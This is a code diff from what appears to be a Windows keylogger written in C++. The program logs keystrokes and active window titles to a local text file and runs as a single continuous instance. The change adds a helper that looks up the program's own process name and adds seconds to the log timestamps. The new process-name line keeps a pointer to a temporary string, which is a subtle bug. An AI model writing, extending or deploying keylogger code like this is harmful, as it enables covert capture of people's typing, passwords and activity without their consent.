@@ -2,8 +2,8 @@
 #include <iostream>
 #include <fstream>
 #include <windows.h>
-#include <algorithm> 
 #include <string> 
+#include <algorithm> 
 #include <ctime>
 #include <sstream>
 #include <tlhelp32.h> 
@@ -26,7 +26,7 @@
         - GetActiveWindowTitle(): Retrieves the title of the active window.
         - SpecialKeys(int key): Converts special keys to their corresponding string representations.
         - IsOnlyOneProcessRunning(const char* processName): Checks if only one instance of a process is running.
-        - main(): The main function of the program.
+        - GetPname(): Retrieves the name of the current process.
 
     Additional Notes:
         - The code is designed to run continuously in a loop until terminated.
@@ -35,6 +35,7 @@
 */
 
 using namespace std;
+
 string Log_File = "log_file.txt";
 
 void SaveInFile(const string& Information) {
@@ -45,6 +46,7 @@ void SaveInFile(const string& Information) {
 }
 
 string currentWindow = "";
+
 string GetActiveWindowTitle() {
     HWND hwnd = GetForegroundWindow();
     if (hwnd != NULL) {
@@ -265,8 +267,21 @@ bool IsOnlyOneProcessRunning(const char* processName) {
     return count == 1;
 }
 
+string GetPname() {
+    char PATH[260]; // as for the max path length is 260 in windows
+    GetModuleFileName(NULL, PATH, 260);
+    string fullPath(PATH);
+    auto pos = fullPath.find_last_of("\\");
+    if (pos != string::npos) {
+        return fullPath.substr(pos + 1);
+    }
+    else {
+        return "";
+    }
+}
+
 int main() {
-    const char* processName = "Project-Elsalakan.exe";
+    const char* processName = GetPname().c_str();
 
     if (!IsOnlyOneProcessRunning(processName)) {
         return 0;
@@ -313,17 +328,17 @@ int main() {
             if (ltm.tm_hour > 12) {
                 ss << ltm.tm_hour - 12 << ":"
                     << ltm.tm_min << ":"
-                    << " PM";
+                    << ltm.tm_sec << " PM";
             }
             else if (ltm.tm_hour == 0) {
                 ss << ltm.tm_hour + 12 << ":"
                     << ltm.tm_min << ":"
-                    << " AM";
+                    << ltm.tm_sec << " AM";
             }
             else {
                 ss << ltm.tm_hour << ":"
                     << ltm.tm_min << ":"
-                    << " AM";
+                    << ltm.tm_sec << " AM";
             }
 
             string dateTime = ss.str();
